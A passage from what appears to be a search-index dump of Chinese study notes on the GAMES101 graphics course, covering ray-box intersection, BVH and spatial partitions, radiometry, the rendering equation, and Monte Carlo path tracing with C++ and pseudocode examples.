dirIsNeg) const\n{\n    // invDir: ray direction(x,y,z), invDir=(1.0/x,1.0/y,1.0/z), use this because Multiply is faster that Division\n    // \u8fd9\u91cc\u5047\u8bbe v=\\sqrt{x^2+y^2+z^2}\uff0c\u5219 v_x = x\uff0c\u90a3\u4e48\u5c31\u80fd\u660e\u767d invDir \u7684\u7528\u5904\u4e86\n    // dirIsNeg: ray direction(x,y,z), dirIsNeg=[int(x&gt;0),int(y&gt;0),int(z&gt;0)], use this to simplify your logic\n    // TODO test if ray bound intersects\n    double t1 = 0, t2 = 0, tmin = 0, tmax = 0;\n    t1 = (pMin.x - ray.origin.x) * invDir.x;\n    t2 = (pMax.x - ray.origin.x) * invDir.x;\n    tmin = (dirIsNeg[0]&gt;0)?t1:t2;\n    tmax = (dirIsNeg[0]&gt;0)?t2:t1;\n    t1 = (pMin.y - ray.origin.y) * invDir.y;\n    t2 = (pMax.y - ray.origin.y) * invDir.y;\n    tmin = std::max(tmin, (dirIsNeg[1]&gt;0)?t1:t2);\n    tmax = std::min(tmax, (dirIsNeg[1]&gt;0)?t2:t1);\n    t1 = (pMin.z - ray.origin.z) * invDir.z;\n    t2 = (pMax.z - ray.origin.z) * invDir.z;\n    tmin = std::max(tmin, (dirIsNeg[2]&gt;0)?t1:t2);\n    tmax = std::min(tmax, (dirIsNeg[2]&gt;0)?t2:t1);\n\n    if(tmin &lt; tmax &amp;&amp; tmax &gt;= 0) return true;\n    else return false;\n}\n</code></pre>"},{"location":"Accumulation/Games101/Ray%20Tracing/#uniform-grids","title":"Uniform Grids","text":"<p>\u5728\u5b9e\u8df5\u4e2d\uff0c\u6211\u4eec\u5c06\u5305\u56f4\u76d2\u5212\u5206\u6210\u4e00\u4e2a\u4e2a\u5c0f\u683c\u5b50\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u9884\u5904\u7406\uff0c\u5224\u65ad\u67d0\u4e00\u683c\u5b50\u5185\u662f\u5426\u6709\u7269\u4f53\u8868\u9762\u5b58\u5728\u3002</p> <p></p> <p>\u5728\u5149\u7ebf\u5c04\u5165\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u5c04\u5165\u7684\u8be5\u683c\u5b50\u5185\u4e0d\u5b58\u5728\u8868\u9762\uff0c\u5219\u53ef\u4ee5\u76f4\u63a5\u7565\u8fc7\uff1b\u5982\u679c\u5b58\u5728\uff0c\u5219\u9700\u8981\u8fdb\u884c\u8868\u9762\u548c\u5149\u7ebf\u7684\u4ea4\u70b9\u5224\u65ad\u3002</p> <p>\u57fa\u672c\u7406\u8bba\u5728\u4e8e\u5149\u7ebf\u4e0e\u76d2\u5b50\u6c42\u4ea4\u901f\u5ea6\u8fdc\u5927\u4e8e\u5149\u7ebf\u4e0e\u4e09\u89d2\u5f62\u9762\u6c42\u4ea4</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u5212\u5206\u7684\u683c\u5b50\u6570\u4e5f\u505a\u4e00\u4e2a\u5e73\u8861\u3002\u5728\u5b9e\u9645\u7b97\u6cd5\u4e2d\uff1a</p> \\[ \\begin{array}c \\#cell =C* \\#objs \\\\ C = 27\\ \\text{in 3D} \\end{array} \\]"},{"location":"Accumulation/Games101/Ray%20Tracing/#spatial-partitions","title":"Spatial Partitions","text":"<p>\u53e6\u4e00\u79cd\u65b9\u6cd5\u662f\u91c7\u7528\u7a7a\u95f4\u5212\u5206</p> <p></p> <ul> <li>Oct Tree \u516b\u53c9\u6811<ul> <li>\u5728\u7a7a\u95f4\u4e2d\uff0c\u5c06 Bounding Box \u5212\u5206\u6210\u7b49\u5927\u516b\u5757\uff0c\u5982\u679c\u5c0f\u5757\u5185\u6709\u7269\u4f53\uff0c\u5219\u7ee7\u7eed\u5207\u6210\u516b\u5757\uff0c\u4e0d\u65ad\u9012\u5f52\uff1b\u5982\u679c\u76d2\u5185\u4e3a\u7a7a\uff0c\u5219\u4e0d\u518d\u5212\u5206\u3002</li> </ul> </li> <li>KD Tree<ul> <li>\u4ea4\u66ff\u8fdb\u884c \\(X,Y,Z\\) \u65b9\u5411\u4e0a\u7684\u5212\u5206</li> </ul> </li> <li>BSP Tree<ul> <li>\u4e0e KD Tree \u7565\u6709\u4e0d\u540c\uff0c\u5176\u5212\u5206\u65b9\u5411\u4e0a\u6ca1\u6709\u8981\u6c42</li> </ul> </li> </ul> <p>\u6240\u4ee5\u7ed9\u5b9a\u4e00\u4e2a\u573a\u666f\uff0c\u9700\u8981\u4f7f\u7528 KD Tree \u9884\u5904\u7406\u3002</p> <p></p> <p>\u5b9e\u9645\u7269\u4f53\u5217\u8868\u53ea\u5b58\u50a8\u5728 KD Tree \u7684\u53f6\u8282\u70b9\u4e0a</p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#object-partitions-bvh","title":"Object Partitions &amp; BVH","text":"<p>Bounding Volume Hierarchy(BVH) \u662f\u975e\u5e38\u5e7f\u6cdb\u5f15\u7528\u7684\u52a0\u901f\u7ed3\u6784\uff0c\u5b83\u89e3\u51b3\u4e86\u4e0a\u8ff0\u4e24\u4e2a\u65b9\u6848\u7684\u7f3a\u70b9\u3002</p> <p></p> <p>\u5176\u601d\u60f3\u4e3a\u5c06\u7269\u4f53\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u5bf9\u6bcf\u90e8\u5206\u6c42\u51fa\u5b83\u4eec\u7684\u5305\u56f4\u76d2\uff0c\u8fd9\u6837\u6bcf\u4e2a\u5305\u56f4\u76d2\u90fd\u5305\u542b\u5b8c\u6574\u7684\u7269\u4f53(\u6216\u9762)\uff0c\u7f3a\u70b9\u662f Bounding Box \u53ef\u80fd\u4f1a\u5b58\u5728\u91cd\u5408\u90e8\u5206\u3002</p> <ul> <li>How to subdivide a node ?<ul> <li>Choose a dimension to split</li> <li>Heuristic 1 Always choose the longest axis in node</li> <li>Heuristic 2 Split node at location of median object</li> </ul> </li> <li>Internal nodes store<ul> <li>Bounding Box</li> <li>Pointers to child</li> </ul> </li> <li>Leaf nodes store<ul> <li>Bounding Box</li> <li>List of objects</li> </ul> </li> </ul> <p>Accelerate Pros &amp; Cons</p> <p></p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#basic-radiometry","title":"Basic Radiometry","text":"<p>\u5c3d\u7ba1 Whitted-Style \u5149\u7ebf\u8ffd\u8e2a\u80fd\u591f\u5f97\u5230\u8f83\u597d\u7684\u7ed3\u679c\uff0c\u4f46\u662f\u8fd9\u4e2a\u6a21\u578b\u5bf9\u4e8e\u7269\u7406\u4e16\u754c\u7684\u6a21\u62df\u5b58\u5728\u5f88\u591a\u8c2c\u8bba\uff0c\u4e5f\u5c31\u4e0d\u53ef\u80fd\u5f97\u5230\u771f\u5b9e\u4e16\u754c\u7684\u5149\u7ebf\u60c5\u51b5\u3002</p> <p>\u5728\u8f90\u5c04\u5ea6\u91cf\u5b66\u4e2d\uff0c\u5149\u5177\u6709\u4ee5\u4e0b\u56db\u4e2a\u7a7a\u95f4\u5c5e\u6027\uff1a</p> <ul> <li>Radiant Flux \u8f90\u5c04\u901a\u91cf</li> <li>Intensity \u5149\u7167\u5f3a\u5ea6</li> <li>Irradiance \u8f90\u5c04\u7167\u5ea6</li> <li>Radiance \u8f90\u5c04\u4eae\u5ea6</li> </ul> <p></p> Radiant Flux <p>Radiant Energy \u662f\u7535\u78c1\u8f90\u5c04\u7684\u80fd\u91cf\uff0c\u4f46\u662f\u5728\u56fe\u5f62\u5b66\u4e2d\u5e76\u4e0d\u5e38\u7528\u3002\u800c Radiant Flux \u662f\u5355\u4f4d\u65f6\u95f4\u5185 emitted,reflected,transmitted, or received \u7684\u80fd\u91cf\uff0c\u5373 energy per unit\uff1a</p> \\[\\begin{array}cQ[J=Joule] \\\\ \\Phi = \\frac{dQ}{dt}[W=Watt][lm=lumen] \\end{array}\\] Intensity <p>\u5b9a\u4e49 Radiant Intensity \u4e3a power per unit solid angle emitted by a point light source.</p> \\[I(\\omega) = \\frac{d\\Phi}{d\\omega}[\\frac{W}{sr}][\\frac{lm}{sr}=cd=candla]\\] <p>\u5176\u4e2d\u7acb\u4f53\u89d2 Solid Angle \u4e3a\u9762\u79ef\u9664\u4ee5\u534a\u5f84\u5e73\u65b9\uff0c\u90a3\u4e48\u6574\u4e2a\u7403\u7684\u7acb\u4f53\u89d2\u4e3a \\(4\\pi\\)</p> \\[d\\omega = \\frac{dA}{r^2}=\\sin \\theta d\\theta d\\phi \\] <p></p> Irradiance <p>\u5b9a\u4e49 Irradiance \u4e3a power per unit area incident on a surface point.</p> \\[E(x)= \\frac{d\\Phi (x)}{dA}[\\frac{W}{m^2}][ \\frac{lm}{m^2}=lux]\\] <p>\u6b64\u65f6\u518d\u56de\u8fc7\u5934\u53bb\u770b\u7740\u8272\u6a21\u578b\u4e2d\u7684 Lambert's Cosine Law\uff1a</p> <p></p> Radiance <p>\u5b9a\u4e49 Radiance \u4e3a power per unit solid angle, per projected unit area\uff0c\u5373\u4e00\u4e2a\u5fae\u5c0f\u7684\u9762\uff0c\u5411\u4e00\u4e2a\u5fae\u5c0f\u7684\u65b9\u5411\u5c04\u51fa\u7684\u80fd\u91cf\uff1a</p> \\[L(p,\\omega)= \\frac{d^2 \\Phi (p,\\omega)}{d\\omega dA \\cos \\theta}[nit]\\] <p>Radiance \u7528\u6765\u63cf\u8ff0\u5149\u7ebf\uff0c\u800c\u5149\u7ebf\u8ffd\u8e2a\u5c31\u662f\u8ba1\u7b97 radiance\u3002</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u5c06 Radiance \u548c\u524d\u9762\u4e24\u4e2a\u57fa\u672c\u5c5e\u6027\u8054\u7cfb\u8d77\u6765\uff1a</p> <ul> <li>Radiance\uff1a Irradiance pre solid angle<ul> <li>\\(L(p,\\omega) = \\frac{dE(p)}{d\\omega \\cos \\theta}\\)</li> </ul> </li> <li>Radiance\uff1a Intensity per projected unit area<ul> <li>\\(L(p,\\omega)=\\frac{dI(p,\\omega)}{dA\\cos \\theta}\\)</li> </ul> </li> </ul> <p>\u5176\u4e2d\uff0cIrradiance \u548c Radiance \u7684\u5173\u7cfb\u5c24\u4e3a\u91cd\u8981\u3002</p> <p>Irradiance \u662f\u5355\u4f4d\u9762\u79ef \\(dA\\) \u63a5\u53d7\u5230\u7684\u80fd\u91cf\u603b\u548c\uff0c\u800c Radiance \u662f\u4ece\u5355\u4f4d\u7acb\u4f53\u89d2\u5c04\u5230 \\(dA\\) \u7684\u80fd\u91cf\uff1a</p> <p></p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#bidirectional-reflectance-distribution-function","title":"Bidirectional Reflectance Distribution Function","text":"<p>\u53cc\u5411\u53cd\u5c04\u5206\u5e03\u51fd\u6570(BRDF)\u7528\u6765\u89e3\u51b3\u5df2\u77e5\u5165\u5c04\u5149\u80fd\u91cf\u548c\u89d2\u5ea6\uff0c\u6c42\u5c04\u5230\u7269\u4f53\u8868\u9762\u5411\u5404\u4e2a\u65b9\u5411\u8f90\u5c04\u51fa\u53bb\u7684\u80fd\u91cf\u548c\u89d2\u5ea6\u3002</p> <p>\u6211\u4eec\u5047\u8bbe\u7269\u4f53\u8868\u9762\u5e76\u4e0d\u662f\u76f4\u63a5\u53cd\u5c04\u5149\u7ebf\uff0c\u800c\u662f\u5c06\u5149\u7ebf\u80fd\u91cf\u5438\u6536\uff0c\u518d\u91cd\u65b0\u53d1\u5c04\u51fa\u53bb\uff0c\u5219\u5bf9\u4e8e\u4e00\u5355\u4f4d\u9762\u79ef\uff0c\u5176\u7528\u6765\u51b3\u5b9a\u5165\u5c04\u65b9\u5411\u4e3a \\(\\omega_i\\) \u7684\u5149\u7ebf\u80fd\u91cf\u548c\u51fa\u5c04\u65b9\u5411\u4e3a \\(\\omega_r\\) \u7684\u5149\u7ebf\u5173\u7cfb\u7684BRDF\u51fd\u6570\u4e3a\uff1a</p> \\[ f_r (\\omega _i \\rightarrow \\omega _r) =\\frac{dL_r(\\omega _r)}{dE_i( \\omega _i)} = \\frac{dL_r(\\omega _r)}{L_i(\\omega _i)\\cos \\theta_i d\\omega_i} \\] <p></p> <p>\u90a3\u4e48\uff0c\u5bf9\u5165\u5c04\u65b9\u5411\u8fdb\u884c\u4e00\u6b21\u79ef\u5206\uff0c\u53ef\u5230\u5230\u8be5\u51fa\u5c04\u65b9\u5411\u7684\u5149\u7ebf\uff1a</p> \\[ \\Rightarrow L_r (p,\\omega_r)=\\int _{H^2} f_r (p,\\omega _r) L_i (p,\\omega _i) \\cos \\theta _i d\\omega _i  \\] <p>\\(L_e(p,\\omega_0)\\) \u662f\u7269\u4f53\u672c\u8eab\u7684\u5149\u3002\u4e0d\u53d1\u5149\u5219\u4e3a 0</p> <p>\u518d\u8003\u8651\u5230\u7269\u4f53\u672c\u8eab\u53ef\u80fd\u5b58\u5728\u7684\u53d1\u5149\uff0c\u6700\u7ec8\u53ef\u4ee5\u5f97\u5230\u66f4\u4e00\u822c\u5316\u7684\u6e32\u67d3\u65b9\u7a0b\uff1a</p> \\[ \\Rightarrow L_o (p,\\omega_o)=L_e(p,\\omega_o) + \\int _{\\Omega ^+} f_r (p, \\omega_i, \\omega _o) L_i (p,\\omega _i) (n\\cdot \\omega_i) d\\omega _i \\] <p>\u4f46\u662f\u5b9e\u9645\u6e32\u67d3\u4e2d\uff0c\u5149\u7ebf\u4ece\u591a\u4e2a\u65b9\u5411\u5c04\u5165\uff0c\u4f7f\u5f97\u4e0a\u8ff0\u79ef\u5206\u96be\u4ee5\u8ba1\u7b97\u3002\u5728\u6b64\uff0c\u6211\u4eec\u4e0d\u6df1\u5165\u8bc1\u660e\u7684\u7ed9\u51fa\u5168\u5c40\u5149\u7167\u7684\u65b9\u7a0b\uff1a</p> \\[ L=E+KE +K^2E +K^3E+... \\] <p>\\(E\\) \u5c31\u4ee3\u8868\u76f4\u63a5\u4ece\u5149\u6e90\u53d1\u51fa\u7684\u5149\uff0c\\(KE\\) \u8868\u793a\u76f4\u63a5\u5149\u7167\uff0c\u5373\u5149\u7167\u5c04\u5230\u8868\u9762\u540e\u53cd\u5c04\u4e00\u6b21\u7684\u5149\u7167\uff0c\u76f8\u5e94\u7684 \\(K^nE\\) \u8868\u793a\u5149\u5f39\u5c04 n \u6b21\u540e\u7684\u5149\u7167\u3002</p>"},{"location":"Accumulation/Games101/Ray%20Tracing/#_1","title":"\u8499\u7279\u5361\u6d1b\u79ef\u5206 &amp; \u8def\u5f84\u8ffd\u8e2a","text":"<p>\u8499\u7279\u5361\u6d1b\u79ef\u5206\u901a\u8fc7\u91c7\u6837\u7684\u65b9\u5f0f\u8ba1\u7b97\u4e00\u4e2a\u5b9a\u79ef\u5206\u3002</p> <p>\u6211\u4eec\u5728\u79ef\u5206\u8303\u56f4 \\([a,b]\\) \u5185\u53d6\u4e00\u968f\u673a\u53d8\u91cf \\(X_i \\sim p(x)\\) \uff0c\u5219\u5176\u5b9a\u79ef\u5206\u4f30\u8ba1\u503c\u4e3a\uff1a</p> \\[ \\int _a^b f(x)dx =F_N= \\frac{1}{N}\\sum _{i=1}^N \\frac{f(X_i)}{ p(X_i)} \\] <p>\\(p(x)\\) \u6307\u7684\u662f PDF\uff0c\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\uff08\u5e76\u975e\u5206\u5e03\u51fd\u6570\uff09</p> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u53d6\u968f\u673a\u53d8\u91cf\u4e3a \\(U(a,b)\\) \uff0c\u5373\u5747\u5300\u91c7\u6837\uff0c\u5219 \\(p(x)=\\frac{1}{b-a}\\) :</p> \\[ F_N = \\frac{b-a}{N} \\sum ^N_{i=1} f(X_i) \\] <ul> <li>The more samples. the less varience \u91c7\u6837\u70b9\u8d8a\u591a\uff0c\u8d8a\u8fd1\u4f3c</li> <li>Sample on x, integrate on x \u5bf9\u8c01\u91c7\u6837\u5c31\u5bf9\u8c01\u79ef\u5206</li> </ul> <p>\u5728 Whitted-Style Ray Tracing \u4e2d\uff0c\u6211\u4eec\u5047\u5b9a\u5149\u7ebf\u7684\u8def\u5f84\u6709\u4ee5\u4e0b\u4e24\u70b9\u6027\u8d28\uff1a</p> <ul> <li>&lt;1&gt; \u5149\u6253\u5230\u5149\u6ed1\u8868\u9762\u65f6\uff0c\u4f1a\u53d1\u751f\u53cd\u5c04\u6216\u6298\u5c04</li> <li>&lt;2&gt; \u5728\u6f2b\u53cd\u5c04\u9762\u4e0a\u505c\u6b62\u53cd\u5c04</li> </ul> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\u8fd9\u79cd\u7b80\u5316\u7406\u89e3\u5b58\u5728\u5f88\u591a\u95ee\u9898\uff0c\u5982\u4e0d\u80fd\u53cd\u6620 Glossy \u6750\u8d28\u7684\u53cd\u5c04\u6027\u8d28\u3001\u6f2b\u53cd\u5c04\u9762\u9700\u8981\u5c06\u5149\u6cbf\u5404\u4e2a\u65b9\u5411\u6563\u5f00\u7b49\u3002</p> <p>\u867d\u7136 Whitted-Style Ray Tracing \u662f\u9519\u8bef\u7684\uff0c\u4e0d\u8fc7\u8f90\u5c04\u5ea6\u91cf\u5b66\u5728\u7269\u7406\u4e0a\u662f\u6b63\u786e\u7684\uff0c\u5373\u6211\u4eec\u53ef\u4ee5\u6839\u636e\u6e32\u67d3\u65b9\u7a0b\u6765\u5b9e\u73b0\u5149\u7ebf\u8ffd\u8e2a\u3002\u6211\u4eec\u5c06\u5c1d\u8bd5\u4f7f\u7528\u8499\u7279\u5361\u6d1b\u79ef\u5206\u6c42\u89e3\u6e32\u67d3\u65b9\u7a0b\u3002</p> \\[\\begin{array}l L_0(p, \\omega _o) &amp; =\\int _{\\Omega^+} L_i(p, \\omega_i) f_r(p, \\omega_i, \\omega_o) (n\\cdot \\omega _i) d\\omega _i \\\\ &amp; =\\frac{1}{N} \\sum_{i=1} ^N \\frac{L_i(o,\\omega_i) f_r(p, \\omega_i, \\omega_o )( n\\cdot \\omega _i)}{ p(\\omega_i)} \\end{array} \\] <pre><code>shade(p, wo):\n    Randomly choose N directions wi~pdf\n    Lo = 0.0\n    for each wi:\n        Trace a ray r(p, wi)\n        if ray r hit the light:\n            Lo += (1/N) * L_i * f_r * cosine / pdf(wi)\n        else if ray r hit an object at position q:\n            Lo += (1/N) * shade(q, -wi) * f_r * cosine / pdf(wi)\n    return Lo\n</code></pre> <p>\u4f46\u662f\u4e0a\u8ff0\u5b9e\u73b0\u6709\u4e00\u4e2a\u95ee\u9898\uff1a\u5149\u7ebf\u5728\u4e00\u4e2a\u70b9\u4e0a\u5f39\u8df3 N \u6b21\uff0c\u9012\u5f52\u6b21\u6570\u592a\u591a\uff0c\u4e3a\u8d85\u591a\u9879\u5f0f\u7ea7\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u53ea\u80fd\u5c06\u5f39\u8df3\u6b21\u6570\u8bbe\u7f6e\u4e3a 1\uff1a</p> <pre><code>shade(p, wo):\n    Randomly choose 1 directions wi~pdf(w)\n    Trace a ray r(p, wi)\n    if ray r hit the light:\n        Lo = L_i * f_r * cosine / pdf(wi)\n    else if ray r hit an object at position q:\n        Lo = shade(q, -wi) * f_r * cosine / pdf(wi)\n    return Lo\n</code></pre> <p>\u4f7f\u7528 \\(N=1\\) \u4f5c\u8499\u7279\u5361\u6d1b\u79ef\u5206\uff0c\u8fd9\u5c31\u53eb\u505a\u8def\u5f84\u8ffd\u8e2a(Path Tracing)</p> <p>\\(N!=1\\) \u5219\u4e3a\u5206\u5e03\u5f0f\u5149\u7ebf\u8ffd\u8e2a</p> <p>\u770b\u8d77\u6765 \\(N=1\\) \u7684\u7ed3\u679c\u4f3c\u4e4e\u662f\u975e\u5e38 noisy \u7684\uff0c\u4f46\u5b9e\u9645\u4e0a\uff0c\u5bf9\u4e8e\u6211\u4eec\u5c4f\u5e55\u4e0a\u663e\u793a\u7684\u4e00\u4e2a\u50cf\u7d20\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5176\u5185\u90e8\u53d6\u591a\u4e2a\u91c7\u6837\u70b9\u8fdb\u884c\u8def\u5f84\u8ffd\u8e2a\uff0c\u6bcf\u4e00\u4e2a\u91c7\u6837\u70b9\u90fd\u53d6\u76f8\u673a\u5230\u8be5\u70b9\u7684\u65b9\u5411\u4f5c\u4e3a\u5149\u7ebf\u91c7\u6837\u65b9\u5411\uff0c\u6700\u540e\u5f97\u5230\u7684\u6548\u679c\u4ecd\u7136\u4e0d\u9519\uff1a</p> <p></p> <pre><code>ray_generation(camPos, pixel):\n    Uniformly choose N sample positions within pixel\n    pixel_radience = 0.0\n    for each sample in the pixel\n        shoot a ray r(camPos, cam_to_sample)\n        if ray r hit the scene at p\n            pixel_radience += 1/N * shade(p, sample_to_cam)\n    return pixel_radience\n</code></pre> <p>\u800c\u5bf9\u4e8e <code>shade</code> \u51fd\u6570\uff0c\u4e5f\u9700\u8981\u8bbe\u7f6e\u4e00\u5b9a\u7684\u5f39\u5c04\u6b21\u6570\u9632\u6b62\u9012\u5f52\u5c42\u6570\u592a\u591a\u3002\u5b9e\u9645\u4e2d\u4f7f\u7528\u7684\u65b9\u6cd5\u662f\u4fc4\u7f57\u65af\u8f6e\u76d8\u8d4c(RR)\uff1a</p> <ul> <li>\u624b\u52a8\u8bbe\u7f6e\u4e00\u4e2a\u6982\u7387 \\(P\\) </li> <li>\u4ee5\u4e00\u5b9a\u6982\u7387 \\(P\\) \u5411\u67d0\u4e00\u65b9\u5411\u53d1\u51fa\u4e00\u6761\u5149\u7ebf\uff0c\u5e76\u5c06\u8fd4\u56de\u7684 <code>shade</code> \u503c\u9664\u4ee5 \\(P\\)</li> <li>\u4ee5\u4e00\u5b9a\u6982\u7387 \\(1-P\\) \u4e0d\u5c04\u51fa\u5149\u7ebf\uff0c\u5219\u8fd4\u56de\u7684 <code>shade</code> \u503c\u4e3a 0</li> <li>\u6700\u7ec8\u5f97\u5230\u7684\u671f\u671b\u503c\u4ecd\u7136\u662f \\(Lo\\) \uff01<ul> <li>\\(E= P\\cdot (Lo / P) + (1-P)\\cdot 0=Lo\\)</li> </ul> </li> </ul> <pre><code>shade(p, wo)\n    Manually specify a probability P_RR\n    Randomly select a ksi in a uniform dist, in [0,1]\n    if(ksi &gt; P_RR) return 0.0\n\n    Randomly choose 1 directions wi~pdf(w)\n    Trace a ray r(p, wi)\n    if ray r hit the light:\n        Lo = L_i * f_r * cosine / pdf(wi) / P_RR\n    else if ray r hit an object at position q:\n        Lo = shade(q, -wi) * f_r * cosine / pdf(wi) / P_RR\n    return Lo\n</code></pre> <p>\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c\u5bf9\u4e00\u4e2a\u50cf\u7d20\u5185\u91c7\u6837\u70b9\u53d6\u8f83\u5c11\u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5f97\u5230\u566a\u70b9\u975e\u5e38\u591a\u7684\u7ed3\u679c\uff1b\u800c\u53d6\u8f83\u591a\u91c7\u6837\u70b9\uff0c\u5219\u53c8\u8fd0\u884c\u65f6\u95f4\u8fc7\u6162\u3002\u4e3a\u4e86\u80fd\u591f\u5b9e\u73b0\u53d6\u8f83\u5c11\u91c7\u6837\u70b9\u7684\u540c\u65f6\u5f97\u5230\u4f18\u79c0\u7684\u7ed3\u679c\uff0c\u6211\u4eec\u9009\u62e9\u91c7\u6837\u5149\u6e90\uff0c\u907f\u514d\u51fa\u73b0\u5747\u5300\u91c7\u6837\u4e0b\u5149\u7ebf\u6253\u4e0d\u4e2d\u5149\u6e90\u7684\u60c5\u51b5\uff0c\u9632\u6b62\u9020\u6210\u6548\u7387\u6d6a\u8d39\u3002</p> <p>\u5176\u57fa\u672c\u6a21\u578b\u5982\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u5bf9\u5149\u6e90\u5355\u4f4d\u9762\u79ef \\(dA\\) \u91c7\u6837\uff0c\u5e76\u5bf9 \\(A\\) \u4f5c\u79ef\u5206\u3002\u6839\u636e\u7acb\u4f53\u89d2\u5b9a\u4e49\uff0c\u6211\u4eec\u6709 \\(dA\\) \u548c \\(d\\omega\\) \u7684\u5173\u7cfb\uff1a</p> \\[ d\\omega = \\frac{dA\\cos \\theta '}{|x' -x|^2} \\] <p></p> <p>\u91cd\u5199\u6e32\u67d3\u65b9\u7a0b\u4e3a\uff1a</p> \\[\\begin{array}l L_0(x, \\omega_o) &amp; = \\int _{\\Omega^+}L_i(p, \\omega_i) f_r(p, \\omega_i, \\omega_o) (n\\cdot \\omega _i) d\\omega _i \\\\ &amp; =\\int _A L_i(x, \\omega_i) f_r(x, \\omega_i, \\omega_o) \\frac{\\cos \\theta \\cos \\theta '}{|x'-x|^2} dA \\end{array}\\] <p>\u5bf9\u8be5\u6e32\u67d3\u65b9\u7a0b\u518d\u4f7f\u7528\u8499\u7279\u5361\u6d1b\u79ef\u5206\uff0c\u5219 \\(pdf=1/A\\) \uff0c\u6b65\u9aa4\u540c\u4e0a\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u8003\u8651\u5149\u7ebf\u6765\u81ea\u4e8e\u5149\u6e90\u548c\u5176\u5b83\u7269\u4f53\u8868\u9762\u53cd\u5c04\u4e24\u90e8\u5206\uff1a</p> <ul> <li>Light source (Direct, no need to use RR)</li> <li>Other reflector (Indirect, RR)</li> </ul> <pre><code>shade(p, wo)\n    # contribution from the light source\n    Uniform sample the light at x', pdf_light = 1/A\n    L_dir = L_i * f_r * cos \u03b8 * cos \u03b8' / |x'-p|^2 / pdf_light\n\n    # contribution from other reflector\n    L_indir = 0.0\n    Manually specify a probability P_RR\n    Randomly select a ksi in a uniform dist, in [0,1]\n    if(ksi &gt; P_RR) return 0.0\n\n    Uniform sample the hemisphere toward wi, pdf_hemi = 1/2pi\n    Trace a ray r(p, wi)\n    if ray r hit a non-emitting object at position q:\n        L_indir = shade(q, -wi) * f_r * cos \u03b8 / pdf_hemi / P_RR\n\n    # return the sum of them\n    return L_dir + L_indir\n</code></pre> <p>\u8ba1\u7b97\u5149\u6e90\u7684\u8d21\u732e\u65f6\uff0c\u8fd8\u8981\u4fdd\u8bc1\u8be5\u70b9\u4e0e\u5149\u6e90\u4e4b\u95f4\u65e0\u906e\u6321</p> <p>Assignment 7\u4e2d C++ \u7684\u5b9e\u73b0\u65b9\u5f0f\uff1a</p> <pre><code>Vector3f Scene::shade(Intersection &amp;pos, const Vector3f &amp;wo) const\n{\n    Vector3f L_dir(0), L_indir(0);\n\n    // \u76f4\u63a5\u5149\u7167\n    Intersection light;\n    float light_pdf;\n    sampleLight(light, light_pdf);\n    Vector3f obj2light = light.coords - pos.coords;\n\n    Vector3f obj2light_normalized = obj2light.normalized();\n    auto t = intersect(Ray(pos.coords, obj2light_normalized));\n    if(t.distance + EPSILON &gt; obj2light.norm())\n    { // \u5149\u7ebf\u672a\u88ab\u906e\u6321\uff0cEPSILON\u653e\u5bbd\u7cbe\u5ea6\u9632\u6b62\u81ea\u76f8\u4ea4\n        Vector3f f_r = pos.m-&gt;eval(obj2light, wo, pos.normal);\n        float cos_theta = std::max(0.0f, dotProduct(pos.normal, obj2light_normalized));\n        float cos_theta_prime = std::max(0.0f, dotProduct(light.normal, -obj2light_normalized));\n        L_dir = light.emit * f_r * cos_theta * cos_theta_prime / (obj2light.norm() * obj2light.norm()) / light_pdf;\n    }\n\n    // \u95f4\u63a5\u5149\u7167\n    if(get_random_float() &lt; RussianRoulette)\n    {\n        Vector3f wi = pos.m-&gt;sample(wo, pos.normal);\n        Ray ray(pos.coords, wi);\n        Intersection next_pos = intersect(ray);\n        if(next_pos.happened)\n        {\n            L_indir = shade(next_pos, -wi);\n            Vector3f f_r = pos.m-&gt;eval(wi, wo, pos.normal);\n            float cos_theta = std::max(0.0f, dotProduct(pos.normal, wi));\n            L_indir = L_indir * f_r * cos_theta * 2 * PI / RussianRoulette;\n        }\n    }\n\n    return L_dir + L_indir;\n}\n</code></pre>"},{"location":"Accumulation/Games101/Shading/","title":"Shading","text":""},{"location":"Accumulation/Games101/Shading/#shading","title":"Shading","text":"<p> \u7ea6 1732 \u4e2a\u5b57  6 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p>"},{"location":"Accumulation/Games101/Shading/#illumination-shading","title":"Illumination &amp; Shading","text":""},{"location":"Accumulation/Games101/Shading/#blinn-phong-reflection-model","title":"Blinn-Phong Reflection Model","text":"<p>\u672c\u8bfe\u7a0b\u4e2d\uff0cShading \u5b9a\u4e49\u4e3a\u5bf9\u4e00\u4e2a\u7269\u4f53\u5e94\u7528\u4e0d\u540c\u7684\u6750\u8d28\u3002</p> <p></p> <ul> <li>Specular highlights - \u9ad8\u5149</li> <li>Diffuse reflection - \u6f2b\u53cd\u5c04</li> <li>Ambient lighting - \u73af\u5883\u7167\u660e</li> </ul> <p>\u4e3a\u4e86\u8ba1\u7b97\u5c40\u90e8\u7279\u5b9a\u70b9\u4e0a\u5149\u7167\u4e0e\u76f8\u673a\u7684\u5173\u7cfb\uff0c\u6211\u4eec\u5b9a\u4e49\u5982\u4e0b\u8f93\u5165\uff1a</p> <p></p> <ul> <li>View direction, \\(v\\)</li> <li>Surface normal, \\(n\\)<ul> <li>\u5728\u6781\u5c0f\u8303\u56f4\u5185\uff0c\u90fd\u53ef\u4ee5\u8ba4\u4e3a\u5e73\u9762\u662f\u65e0\u5f2f\u66f2\u7684</li> </ul> </li> <li>Light direction, \\(l\\)<ul> <li>For each of many lights</li> </ul> </li> <li>Surface parameters<ul> <li>color, shininess...</li> </ul> </li> </ul> 